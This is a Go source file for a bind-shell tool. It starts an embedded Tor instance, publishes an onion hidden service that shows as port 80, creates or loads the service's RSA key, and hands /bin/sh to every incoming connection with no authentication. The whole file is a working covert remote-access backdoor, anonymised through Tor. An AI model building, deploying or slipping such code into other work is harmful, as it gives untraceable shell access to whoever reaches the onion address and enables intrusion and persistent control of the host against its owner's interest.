package main

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"path"
	"time"

	"github.com/cretz/bine/process"
	"github.com/cretz/bine/tor"
	libtor "github.com/ipsn/go-libtor"
)

type Config struct {
	TorConfig        tor.StartConf
	TorListenConfig  tor.ListenConf
	Timeout          int
	BindShellProgram string
	OneShot          bool
}

// Link bine with go-libtor instance creator
var creator = libtor.Creator

type LibTorWrapper struct{}

func (LibTorWrapper) New(ctx context.Context, args ...string) (process.Process, error) {
	return creator.New(ctx, args...)
}

func parseArgs() Config {
	config := Config{}

	config.TorConfig = tor.StartConf{}
	config.TorConfig.ProcessCreator = LibTorWrapper{}
	config.TorConfig.DebugWriter = os.Stderr
	flag.StringVar(&config.TorConfig.DataDir, "data-dir", "", "Where Tor data is stored. If not defined, a directory is created")

	config.TorListenConfig = tor.ListenConf{}
	var flagHiddenSrvPort int
	flag.IntVar(&flagHiddenSrvPort, "hiddensrvport", 80, "Tor hidden service port where bind-shell will be started")
	config.TorListenConfig.Detach = true

	flag.IntVar(&config.Timeout, "timeout", 180, "Timeout in seconds for Tor setup")
	flag.StringVar(&config.BindShellProgram, "bind-shell-program", "/bin/sh", "Program to execute on bind-shell")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n\n", path.Base(os.Args[0]))
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\n")
	}

	flag.Parse()
	config.TorListenConfig.RemotePorts = []int{flagHiddenSrvPort}
	return config
}

func main() {
	config := parseArgs()
	// Start tor with some defaults + elevated verbosity
	fmt.Println("Starting and registering onion service, please wait a bit...")
	t, err := tor.Start(nil, &config.TorConfig)
	if err != nil {
		log.Panicf("Failed to start tor: %v", err)
	}
	defer t.Close()

	// Wait at most a few minutes to publish the service
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(config.Timeout)*time.Second)
	defer cancel()

	if _, err := os.Stat(config.TorConfig.DataDir + "/keys/onion.pem"); os.IsNotExist(err) {
		// No key, so force creation
		// openssl genrsa -out $datadir/keys/onion.pem 1024
		key, err := rsa.GenerateKey(rand.Reader, 1024)
		if err != nil {
			log.Panicf("Failed to generate RSA private key")
		}
		config.TorListenConfig.Key = key

		if config.TorConfig.DataDir == "" {
			currentdir, _ := os.Getwd()
			if config.TorConfig.DataDir, err = ioutil.TempDir(currentdir, "data-dir-"); err != nil {
				log.Panicf("Cannot create data-dir. %v", err)
			}
		}
		keyfile, err := os.Create(config.TorConfig.DataDir + "/keys/onion.pem")
		if err != nil {
			log.Panicf("Cannot save RSA private key. %v", err)
		}
		pem.Encode(keyfile, &pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(key),
		})

	} else {
		// Found key for onion service
		buff, err := ioutil.ReadFile(config.TorConfig.DataDir + "/keys/onion.pem")
		block, _ := pem.Decode(buff)
		key, err := x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			log.Panicf("Wrong private key format")
		}
		config.TorListenConfig.Key = key
	}
	// Create an onion service to listen on any port but show as 80
	onion, err := t.Listen(ctx, &config.TorListenConfig)
	if err != nil {
		log.Panicf("Failed to create onion service: %v", err)
	}
	defer onion.Close()

	for _, port := range config.TorListenConfig.RemotePorts {
		fmt.Printf("Bind shell is listening on %v.onion:%v\n", onion.ID, port)
	}

	for {
		conn, err := onion.Accept()
		if err != nil {
			fmt.Println("Error: %v", err)
			continue
		}
		go handleClient(conn, config.BindShellProgram)
	}
}

func handleClient(conn net.Conn, program string) {
	fmt.Println("Handling Client")
	defer conn.Close()
	cmd := exec.Command(program)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	cmd.Run()
}
